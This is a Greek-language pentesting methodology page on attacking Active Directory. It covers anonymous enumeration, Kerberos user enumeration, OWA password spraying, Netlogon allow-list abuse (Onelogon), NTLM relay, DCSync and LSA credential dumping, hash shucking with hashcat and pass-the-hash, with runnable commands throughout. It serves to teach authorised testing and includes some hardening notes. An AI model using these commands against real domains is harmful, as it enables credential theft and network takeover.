# Μεθοδολογία Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Βασική επισκόπηση

Το **Active Directory** αποτελεί θεμελιώδη τεχνολογία, η οποία επιτρέπει στους **διαχειριστές δικτύου** να δημιουργούν και να διαχειρίζονται αποτελεσματικά **domains**, **χρήστες** και **αντικείμενα** σε ένα δίκτυο. Έχει σχεδιαστεί ώστε να κλιμακώνεται, διευκολύνοντας την οργάνωση μεγάλου αριθμού χρηστών σε διαχειρίσιμες **ομάδες** και **υποομάδες**, ενώ παράλληλα ελέγχει τα **δικαιώματα πρόσβασης** σε διάφορα επίπεδα.

Η δομή του **Active Directory** αποτελείται από τρία κύρια επίπεδα: **domains**, **trees** και **forests**. Ένα **domain** περιλαμβάνει μια συλλογή αντικειμένων, όπως **χρήστες** ή **συσκευές**, που μοιράζονται μια κοινή βάση δεδομένων. Τα **trees** είναι ομάδες αυτών των domains που συνδέονται μέσω μιας κοινής δομής, ενώ ένα **forest** είναι μια συλλογή πολλών trees, τα οποία συνδέονται μέσω **trust relationships** και σχηματίζουν το ανώτατο επίπεδο της οργανωτικής δομής. Σε καθένα από αυτά τα επίπεδα μπορούν να οριστούν συγκεκριμένα **δικαιώματα πρόσβασης** και **επικοινωνίας**.

Οι βασικές έννοιες του **Active Directory** είναι οι εξής:

1. **Κατάλογος** – Περιέχει όλες τις πληροφορίες που αφορούν τα αντικείμενα του Active Directory.
2. **Αντικείμενο** – Δηλώνει οντότητες του καταλόγου, όπως **χρήστες**, **ομάδες** ή **κοινόχρηστους φακέλους**.
3. **Domain** – Λειτουργεί ως κοντέινερ για τα αντικείμενα του καταλόγου. Σε ένα **forest** μπορούν να συνυπάρχουν πολλά domains, καθένα με τη δική του συλλογή αντικειμένων.
4. **Tree** – Ομάδα domains που μοιράζονται ένα κοινό root domain.
5. **Forest** – Το ανώτατο επίπεδο οργανωτικής δομής στο Active Directory, αποτελούμενο από διάφορα trees με **trust relationships** μεταξύ τους.

Το **Active Directory Domain Services (AD DS)** περιλαμβάνει μια σειρά υπηρεσιών που είναι κρίσιμες για την κεντρική διαχείριση και επικοινωνία σε ένα δίκτυο. Αυτές οι υπηρεσίες περιλαμβάνουν:

1. **Domain Services** – Συγκεντρώνει την αποθήκευση δεδομένων και διαχειρίζεται τις αλληλεπιδράσεις μεταξύ **χρηστών** και **domains**, συμπεριλαμβανομένων των λειτουργιών **authentication** και **αναζήτησης**.
2. **Certificate Services** – Διαχειρίζεται τη δημιουργία, τη διανομή και τη διαχείριση ασφαλών **ψηφιακών πιστοποιητικών**.
3. **Lightweight Directory Services** – Υποστηρίζει εφαρμογές με δυνατότητα χρήσης καταλόγου μέσω του **LDAP protocol**.
4. **Directory Federation Services** – Παρέχει δυνατότητες **single-sign-on** για την αυθεντικοποίηση χρηστών σε πολλές web εφαρμογές κατά τη διάρκεια μίας συνεδρίας.
5. **Rights Management** – Συμβάλλει στην προστασία υλικού που καλύπτεται από πνευματικά δικαιώματα, ρυθμίζοντας τη μη εξουσιοδοτημένη διανομή και χρήση του.
6. **DNS Service** – Είναι κρίσιμη για την επίλυση **domain names**.

Για αναλυτικότερη εξήγηση, δείτε: [**Ορισμός του Active Directory - TechTerms**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Για να μάθετε πώς να **κάνετε επίθεση σε ένα AD**, πρέπει να **κατανοήσετε** πολύ καλά τη διαδικασία **Kerberos authentication**.\
[**Διαβάστε αυτή τη σελίδα αν δεν γνωρίζετε ακόμη πώς λειτουργεί.**](kerberos-authentication.md)

## Συνοπτικός οδηγός

Μπορείτε να επισκεφτείτε το [https://wadcoms.github.io/](https://wadcoms.github.io) για μια γρήγορη επισκόπηση των εντολών που μπορείτε να εκτελέσετε για να κάνετε enumerate/exploit ένα AD.

> [!WARNING]
> Η επικοινωνία Kerberos **απαιτεί συνήθως πλήρως προσδιορισμένο όνομα domain (FQDN)**, ώστε ο client να μπορεί να λάβει ticket για το σωστό SPN. Η πρόσβαση σε ένα μηχάνημα μέσω διεύθυνσης IP συνήθως οδηγεί σε εναλλακτική χρήση του NTLM αντί του Kerberos.

## Αναγνώριση Active Directory (χωρίς διαπιστευτήρια/συνεδρίες)

Αν έχετε πρόσβαση σε ένα περιβάλλον AD, αλλά δεν έχετε διαπιστευτήρια/συνεδρίες, μπορείτε να:

- **Κάνετε pentest στο δίκτυο:**
  - Σαρώστε το δίκτυο, εντοπίστε μηχανήματα και ανοιχτές θύρες και προσπαθήστε να **κάνετε exploit σε ευπάθειες** ή να **εξαγάγετε διαπιστευτήρια** από αυτά (για παράδειγμα, [οι εκτυπωτές μπορεί να είναι πολύ ενδιαφέροντες στόχοι](ad-information-in-printers.md)).
  - Η απαρίθμηση DNS μπορεί να αποκαλύψει πληροφορίες για βασικούς servers του domain, όπως web, printers, shares, vpn, media κ.λπ.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Δείτε τη γενική [**Μεθοδολογία Pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) για περισσότερες πληροφορίες σχετικά με το πώς να το κάνετε.
- **Ελέγξτε για null και Guest access στις υπηρεσίες smb** (δεν θα λειτουργήσει σε σύγχρονες εκδόσεις των Windows):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Μπορείτε να βρείτε εδώ έναν αναλυτικότερο οδηγό για την απαρίθμηση ενός SMB server:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Κάντε enumerate το Ldap**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Μπορείτε να βρείτε εδώ έναν αναλυτικότερο οδηγό για την απαρίθμηση του LDAP (δώστε **ιδιαίτερη προσοχή στην ανώνυμη πρόσβαση**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Δηλητηριάστε το δίκτυο**
  - Συλλέξτε διαπιστευτήρια [**προσποιούμενοι υπηρεσίες με το Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Αποκτήστε πρόσβαση σε host [**κάνοντας κατάχρηση της relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Συλλέξτε διαπιστευτήρια **εκθέτοντας** [**ψεύτικες υπηρεσίες UPnP με το evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Εξαγάγετε ονόματα χρηστών/πραγματικά ονόματα από εσωτερικά έγγραφα, μέσα κοινωνικής δικτύωσης και υπηρεσίες (κυρίως web) εντός των περιβαλλόντων του domain, καθώς και από δημόσια διαθέσιμες πηγές.
  - Αν βρείτε τα πλήρη ονόματα των εργαζομένων της εταιρείας, μπορείτε να δοκιμάσετε διαφορετικές συμβάσεις ονομασίας **username του AD (**[**διαβάστε εδώ**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Οι πιο συνηθισμένες συμβάσεις είναι: _NameSurname_, _Name.Surname_, _NamSur_ (3 γράμματα από το καθένα), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _τυχαία γράμματα και 3 τυχαίοι αριθμοί_ (abc123).
  - Εργαλεία:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Απαρίθμηση χρηστών

- **Ανώνυμο SMB/LDAP enum:** Δείτε τις σελίδες [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) και [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Όταν υποβάλλεται αίτημα με **μη έγκυρο username**, ο server απαντά με τον κωδικό σφάλματος Kerberos _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, επιτρέποντάς μας να διαπιστώσουμε ότι το username δεν είναι έγκυρο. Για **έγκυρα usernames**, θα επιστραφεί είτε το **TGT σε απόκριση AS-REP** είτε το σφάλμα _KRB5KDC_ERR_PREAUTH_REQUIRED_, το οποίο υποδεικνύει ότι ο χρήστης πρέπει να εκτελέσει pre-authentication.
- **Χωρίς Authentication μέσω MS-NRPC**: Χρήση του auth-level = 1 (No authentication) έναντι της διεπαφής MS-NRPC (Netlogon) στους domain controllers. Η μέθοδος καλεί τη συνάρτηση `DsrGetDcNameEx2` μετά τη σύνδεση στη διεπαφή MS-NRPC, για να ελέγξει αν υπάρχει ο χρήστης ή ο υπολογιστής χωρίς διαπιστευτήρια. Το εργαλείο [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) υλοποιεί αυτόν τον τύπο απαρίθμησης. Η έρευνα είναι διαθέσιμη [εδώ](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Αν εντοπίσετε έναν από αυτούς τους servers στο δίκτυο, μπορείτε επίσης να εκτελέσετε **user enumeration εναντίον του**. Για παράδειγμα, μπορείτε να χρησιμοποιήσετε το εργαλείο [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Μπορείτε να βρείτε λίστες ονομάτων χρηστών σε [**αυτό το github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) και σε αυτό ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Ωστόσο, θα πρέπει να έχετε τα **ονόματα των ανθρώπων που εργάζονται στην εταιρεία** από το βήμα recon που θα έπρεπε να έχετε κάνει νωρίτερα. Με το όνομα και το επώνυμο, θα μπορούσατε να χρησιμοποιήσετε το script [**namemash.py**](https://gist.github.com/superkojiman/11076951) για να δημιουργήσετε πιθανά έγκυρα usernames.

### Κατάχρηση allow-list ευάλωτου καναλιού Netlogon (Onelogon)

Ακόμα κι αφού γίνει patch για το **Zerologon** στον DC, οι λογαριασμοί που έχουν προστεθεί ρητά στη λίστα επιτρεπόμενων μπορούν και πάλι να εκτεθούν σε **παλαιότερη/ευάλωτη συμπεριφορά του ασφαλούς καναλιού Netlogon**. Η επικίνδυνη ρύθμιση είναι το GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ή η αντίστοιχη τιμή μητρώου **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Αυτή η τιμή είναι ένας **περιγραφέας ασφαλείας SDDL** (δείτε [Security Descriptors](security-descriptors.md)). Κάθε λογαριασμός ή ομάδα που έχει το σχετικό ACE στο DACL μπορεί να γίνει στόχος. Για παράδειγμα, το `O:BAG:BAD:(A;;RC;;;WD)` προσθέτει ουσιαστικά στη λίστα επιτρεπόμενων τους **Everyone**.

Πρακτική ροή εργασίας για τον operator:

1. **Εντοπίστε τα principals στη λίστα επιτρεπόμενων**, ελέγχοντας τόσο το **SYSVOL/GPO** όσο και το **live μητρώο του DC**.
2. **Αντιστοιχίστε τα SIDs** του SDDL σε πραγματικούς χρήστες/υπολογιστές AD και δώστε προτεραιότητα στους **λογαριασμούς μηχανημάτων DC**, στους **λογαριασμούς trust** και σε άλλα προνομιούχα μηχανήματα.
3. Δοκιμάστε επανειλημμένα **MS-NRPC / Netlogon authentication** ως ο λογαριασμός που βρίσκεται στη λίστα επιτρεπόμενων.
4. Μετά από μια επιτυχημένη εικασία, καταχραστείτε τη λειτουργία **Netlogon password-setting** για να επαναφέρετε τον κωδικό πρόσβασης του λογαριασμού-στόχου (το δημόσιο PoC τον ορίζει σε κενή συμβολοσειρά).<sup>[[9]](#references)[[10]](#references)</sup>

Γρήγορα παραδείγματα triage / lab από το δημόσιο artifact:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Σημειώσεις:

- Ο **scanner** είναι χρήσιμος, επειδή η ενεργή allow-list μπορεί να βρίσκεται στο **SYSVOL**, στο **registry** ή και στα δύο.
- Η ίδια η διαδρομή εκμετάλλευσης είναι σημαντική, επειδή **δεν απαιτεί προνόμια Domain Admin** αφού εντοπιστεί ένας ευάλωτος λογαριασμός.
- Η παραβίαση ενός **λογαριασμού μηχανήματος Domain Controller**, όπως του `DC$`, είναι ιδιαίτερα επικίνδυνη, επειδή η επαναφορά του κωδικού πρόσβασης μπορεί να ενεργοποιήσει άμεσα ευρύτερες διαδρομές για **AD takeover**.
- Η δυνατότητα **brute force** εξαρτάται από τη λειτουργία: το δημόσιο artifact περιγράφει μια προσέγγιση meet-in-the-middle, brute force **24-bit** όταν είναι διαθέσιμος ένας άλλος λογαριασμός υπολογιστή και πιο αργές παραλλαγές **32-bit**.

Σημειώσεις για εντοπισμό / θωράκιση:

- Ελέγξτε την πολιτική allow-list και αφαιρέστε τα πάντα εκτός από προσωρινές εξαιρέσεις συμβατότητας που απαιτούνται ρητά.
- Παρακολουθείτε τα συμβάντα **5827/5828/5829/5830/5831** του **System** στους DC, για να εντοπίζετε ευάλωτες συνδέσεις Netlogon που απορρίπτονται, εντοπίζονται ή επιτρέπονται ρητά από την πολιτική.
- Αντιμετωπίζετε τους λογαριασμούς στο `VulnerableChannelAllowList` ως **υψηλού κινδύνου** μέχρι να καταργηθεί η εξάρτηση από παλαιότερη λειτουργικότητα.

### Γνωρίζοντας ένα ή περισσότερα usernames

Εντάξει, γνωρίζετε ότι έχετε ήδη ένα έγκυρο username, αλλά δεν έχετε κωδικούς πρόσβασης... Τότε δοκιμάστε:

- [**ASREPRoast**](asreproast.md): Αν ένας χρήστης **δεν έχει** το attribute _DONT_REQ_PREAUTH_, μπορείτε να **ζητήσετε ένα μήνυμα AS_REP** για αυτόν τον χρήστη, το οποίο θα περιέχει δεδομένα κρυπτογραφημένα με μια παράγωγη τιμή του κωδικού πρόσβασης του χρήστη.
- [**Password Spraying**](password-spraying.md): Ας δοκιμάσουμε τους πιο **συνηθισμένους κωδικούς πρόσβασης** με κάθε χρήστη που ανακαλύψαμε· ίσως κάποιος χρησιμοποιεί έναν αδύναμο κωδικό πρόσβασης (λάβετε υπόψη την πολιτική κωδικών πρόσβασης!).
  - Σημειώστε ότι μπορείτε επίσης να κάνετε **spray σε OWA servers**, για να προσπαθήσετε να αποκτήσετε πρόσβαση στους mail servers των χρηστών.


{{#ref}}
password-spraying.md
{{#endref}}

### Poisoning LLMNR/NBT-NS

Ίσως μπορέσετε να **αποκτήσετε** ορισμένα challenge **hashes**, κάνοντας **poisoning** σε κάποια πρωτόκολλα του **δικτύου**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Η απαρίθμηση του Active Directory παρέχει usernames, αναγνωριστικά email και μοτίβα ονοματοδοσίας, πιθανούς hosts και υπηρεσίες που μπορούν να εξαναγκαστούν να πραγματοποιήσουν authentication. Χρησιμοποιήστε αυτό το πλαίσιο για να εντοπίσετε βιώσιμες [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM και πιθανά μονοπάτια προς το περιβάλλον AD.

### Αναγνώριση και έλεγχοι relay posture με βάση τα workspaces του NetExec

- Χρησιμοποιήστε τα **workspaces του `nxcdb`** για να διατηρείτε την κατάσταση του AD recon ανά engagement: το `workspace create <name>` δημιουργεί SQLite DB ανά πρωτόκολλο στο `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Αλλάξτε προβολές με `proto smb|mssql|winrm` και εμφανίστε τα συλλεγμένα secrets με `creds`. Διαγράψτε χειροκίνητα τα ευαίσθητα δεδομένα όταν τελειώσετε: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Η γρήγορη ανακάλυψη subnet με **`netexec smb <cidr>`** εμφανίζει τα **domain**, **OS build**, **απαιτήσεις SMB signing** και **Null Auth**. Τα μέλη που εμφανίζουν `(signing:False)` είναι **ευάλωτα σε relay**, ενώ οι DC συνήθως απαιτούν signing.
- Δημιουργήστε **hostnames στο /etc/hosts** απευθείας από την έξοδο του NetExec, για ευκολότερη στόχευση:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Όταν το **SMB relay προς τον DC αποκλείεται** λόγω signing, ελέγξτε και τη στάση του **LDAP**: το `netexec ldap <dc>` εμφανίζει `(signing:None)` / αδύναμο channel binding. Ένας DC με υποχρεωτικό SMB signing αλλά απενεργοποιημένο LDAP signing παραμένει βιώσιμος στόχος **relay-to-LDAP** για καταχρήσεις όπως το **SPN-less RBCD**.

### Credential leaks εκτυπωτών από την πλευρά του client → μαζική επαλήθευση διαπιστευτηρίων domain

- Τα UI εκτυπωτών/web μερικές φορές **ενσωματώνουν καλυμμένους κωδικούς πρόσβασης διαχειριστή σε HTML**. Η προβολή του source/devtools μπορεί να αποκαλύψει cleartext (π.χ., `<input value="<password>">`), επιτρέποντας πρόσβαση μέσω Basic-auth σε αποθετήρια σάρωσης/εκτύπωσης.
- Οι ανακτημένες εργασίες εκτύπωσης μπορεί να περιέχουν **έγγραφα onboarding σε plaintext** με κωδικούς πρόσβασης ανά χρήστη. Διατηρήστε σωστά αντιστοιχισμένα τα ζεύγη κατά τις δοκιμές:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Υποκλοπή NTLM Creds

Αν μπορείς να **αποκτήσεις πρόσβαση σε άλλους υπολογιστές ή shares** με τον **null ή guest user**, θα μπορούσες να **τοποθετήσεις αρχεία** (όπως ένα αρχείο SCF) που, αν κάποιος αποκτήσει με κάποιον τρόπο πρόσβαση σε αυτά, θα **προκαλέσουν NTLM authentication εναντίον σου**, ώστε να μπορέσεις να **υποκλέψεις** το **NTLM challenge** και να το κάνεις crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

Το **Hash shucking** χρησιμοποιεί κάθε NT hash που έχεις ήδη στην κατοχή σου ως υποψήφιο password για άλλες, πιο αργές μορφές hash, των οποίων το key material παράγεται απευθείας από το NT hash. Αντί να κάνεις brute-force σε μεγάλες passphrases μέσα σε Kerberos RC4 tickets, NetNTLM challenges ή cached credentials, δίνεις τα NT hashes στις λειτουργίες NT-candidate του Hashcat και το αφήνεις να ελέγξει αν έχει επαναχρησιμοποιηθεί κάποιο password, χωρίς να χρειαστεί ποτέ να μάθεις το plaintext. Αυτή η τεχνική είναι ιδιαίτερα αποτελεσματική μετά από παραβίαση domain, όταν μπορείς να συλλέξεις χιλιάδες τρέχοντα και παλαιότερα NT hashes.<sup>[[5]](#references)</sup>

Χρησιμοποίησε το shucking όταν:

- Έχεις ένα corpus NT hashes από DCSync, dumps των SAM/SECURITY ή credential vaults και χρειάζεται να ελέγξεις αν έχουν επαναχρησιμοποιηθεί σε άλλα domains/forests.
- Συλλαμβάνεις Kerberos material βασισμένο σε RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses ή DCC/DCC2 blobs.
- Θέλεις να αποδείξεις γρήγορα την επαναχρησιμοποίηση μεγάλων, μη αποκρυπτογραφήσιμων passphrases και να κάνεις αμέσως pivot μέσω Pass-the-Hash.

Η τεχνική **δεν λειτουργεί** με encryption types των οποίων τα keys δεν είναι το NT hash (π.χ. Kerberos etype 17/18 AES). Αν ένα domain επιβάλλει χρήση μόνο AES, πρέπει να επιστρέψεις στις κανονικές λειτουργίες password.

#### Δημιουργία corpus NT hashes

- **DCSync/NTDS** – Χρησιμοποίησε το `secretsdump.py` μαζί με το history, για να συλλέξεις το μεγαλύτερο δυνατό σύνολο NT hashes (και τις προηγούμενες τιμές τους):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Οι καταχωρίσεις ιστορικού διευρύνουν σημαντικά το σύνολο υποψηφίων, επειδή η Microsoft μπορεί να αποθηκεύει έως και 24 προηγούμενα hashes ανά λογαριασμό. Για περισσότερους τρόπους συλλογής NTDS secrets, δείτε:

{{#ref}}
dcsync.md
{{#endref}}

- **Αποτυπώσεις cache endpoint** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ή Mimikatz `lsadump::sam /patch`) εξάγει τοπικά δεδομένα SAM/SECURITY και cached domain logons (DCC/DCC2). Αφαιρέστε τα διπλότυπα και προσθέστε αυτά τα hashes στην ίδια λίστα `nt_candidates.txt`.
- **Παρακολούθηση μεταδεδομένων** – Διατηρείτε το username/domain που παρήγαγε κάθε hash (ακόμα κι αν η wordlist περιέχει μόνο hex). Όταν το Hashcat εμφανίσει τον κωδικό που βρέθηκε, τα hashes που ταιριάζουν σάς δείχνουν αμέσως ποιο principal επαναχρησιμοποιεί τον ίδιο κωδικό.
- Προτιμήστε candidates από το ίδιο forest ή από ένα trusted forest· έτσι μεγιστοποιείται η πιθανότητα επικάλυψης κατά το shucking.

#### Λειτουργίες NT-candidate του Hashcat

| Τύπος hash                              | Λειτουργία password | Λειτουργία NT-candidate |
| --------------------------------------- | ------------------- | ----------------------- |
| Domain Cached Credentials (DCC)         | 1100                | 31500                   |
| Domain Cached Credentials 2 (DCC2)      | 2100                | 31600                   |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500                | 27000                   |
| NetNTLMv2                               | 5600                | 27100                   |
| Kerberos 5 etype 23 AS-REQ Pre-Auth     | 7500                | _N/A_                   |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100               | 35300                   |
| Kerberos 5 etype 23 AS-REP              | 18200               | 35400                   |

Σημειώσεις:

- Οι είσοδοι NT-candidate **πρέπει να παραμένουν raw NT hashes 32 hex χαρακτήρων**. Απενεργοποιήστε τις rule engines (χωρίς `-r` ή hybrid modes), επειδή το mangling αλλοιώνει το υλικό του candidate key.
- Αυτές οι λειτουργίες δεν είναι εγγενώς ταχύτερες, αλλά ο χώρος κλειδιών NTLM (~30.000 MH/s σε M3 Max) είναι ~100× ταχύτερος από το Kerberos RC4 (~300 MH/s). Η δοκιμή μιας επιμελημένης λίστας NT είναι πολύ οικονομικότερη από την εξερεύνηση ολόκληρου του χώρου κωδικών στην αργή μορφή.
- Χρησιμοποιείτε πάντα το **πιο πρόσφατο build του Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), επειδή οι λειτουργίες 31500/31600/35300/35400 κυκλοφόρησαν πρόσφατα.<sup>[[7]](#references)</sup>
- Προς το παρόν δεν υπάρχει λειτουργία NT για AS-REQ Pre-Auth, ενώ οι AES etypes (19600/19700) απαιτούν τον plaintext κωδικό, επειδή τα κλειδιά τους παράγονται μέσω PBKDF2 από κωδικούς UTF-16LE και όχι από raw NT hashes.

#### Παράδειγμα – Kerberoast RC4 (λειτουργία 35300)

1. Συλλέξτε ένα RC4 TGS για ένα SPN-στόχο με χρήστη χαμηλών προνομίων (δείτε τη σελίδα Kerberoast για λεπτομέρειες):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Κάντε Shuck το ticket με τη λίστα NT σας:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Το Hashcat παράγει το κλειδί RC4 από κάθε υποψήφιο NT και επικυρώνει το blob `$krb5tgs$23$...`. Ένα ταίριασμα επιβεβαιώνει ότι ο λογαριασμός υπηρεσίας χρησιμοποιεί ένα από τα υπάρχοντα NT hashes σας.

3. Μεταβείτε αμέσως μέσω PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Μπορείτε προαιρετικά να ανακτήσετε αργότερα το απλό κείμενο με `hashcat -m 1000 <matched_hash> wordlists/`, αν χρειαστεί.

#### Παράδειγμα – Διαπιστευτήρια προσωρινής αποθήκευσης (mode 31600)

1. Κάντε dump των αποθηκευμένων συνδέσεων από έναν παραβιασμένο σταθμό εργασίας:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Αντιγράψτε τη γραμμή DCC2 του ενδιαφέροντος χρήστη του domain στο `dcc2_highpriv.txt` και κάντε shuck:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Μια επιτυχής αντιστοίχιση αποδίδει το NT hash που είναι ήδη γνωστό στη λίστα σου, αποδεικνύοντας ότι ο cached χρήστης επαναχρησιμοποιεί έναν κωδικό πρόσβασης. Χρησιμοποίησέ το απευθείας για PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ή κάνε brute-force σε fast NTLM mode για να ανακτήσεις το κείμενο.

Η ίδια ακριβώς διαδικασία ισχύει για NetNTLM challenge-responses (`-m 27000/27100`) και DCC (`-m 31500`). Μόλις εντοπιστεί μια αντιστοίχιση, μπορείς να ξεκινήσεις relay, SMB/WMI/WinRM PtH ή να ξανακάνεις crack το NT hash offline με masks/rules.



## Enumeration του Active Directory ΜΕ credentials/session

Για αυτή τη φάση πρέπει να έχεις **παραβιάσει τα credentials ή ένα session ενός έγκυρου domain account.** Αν έχεις κάποια έγκυρα credentials ή ένα shell ως domain user, **να θυμάσαι ότι οι επιλογές που αναφέρθηκαν προηγουμένως παραμένουν διαθέσιμες για την παραβίαση άλλων χρηστών**.

Πριν ξεκινήσεις authenticated enumeration, κατανόησε το **Kerberos double-hop problem**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Η παραβίαση ενός account είναι ένα **σημαντικό βήμα για την αξιολόγηση του domain**, επειδή επιτρέπει authenticated **Active Directory enumeration**:

Σε ό,τι αφορά το [**ASREPRoast**](asreproast.md), μπορείς πλέον να εντοπίσεις κάθε δυνητικά ευάλωτο χρήστη, ενώ με το [**Password Spraying**](password-spraying.md) μπορείς να αποκτήσεις μια **λίστα με όλα τα usernames** και να δοκιμάσεις τον κωδικό πρόσβασης του παραβιασμένου account, κενούς κωδικούς πρόσβασης και νέους υποσχόμενους κωδικούς.

- Μπορείς να χρησιμοποιήσεις το [**CMD για βασικό recon**](../basic-cmd-for-pentesters.md#domain-info)
- Μπορείς επίσης να χρησιμοποιήσεις [**powershell για recon**](../basic-powershell-for-pentesters/index.html), το οποίο θα είναι πιο stealthy
- Μπορείς επίσης να [**χρησιμοποιήσεις το powerview**](../basic-powershell-for-pentesters/powerview.md) για να εξαγάγεις πιο λεπτομερείς πληροφορίες
- Ένα άλλο εξαιρετικό εργαλείο για recon σε ένα active directory είναι το [**BloodHound**](bloodhound.md). **Δεν είναι ιδιαίτερα stealthy** (ανάλογα με τις μεθόδους συλλογής που χρησιμοποιείς), αλλά **αν δεν σε απασχολεί** αυτό, αξίζει οπωσδήποτε να το δοκιμάσεις. Βρες πού μπορούν οι χρήστες να κάνουν RDP, βρες διαδρομές προς άλλες ομάδες κ.λπ.
  - **Άλλα αυτοματοποιημένα εργαλεία AD enumeration είναι:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
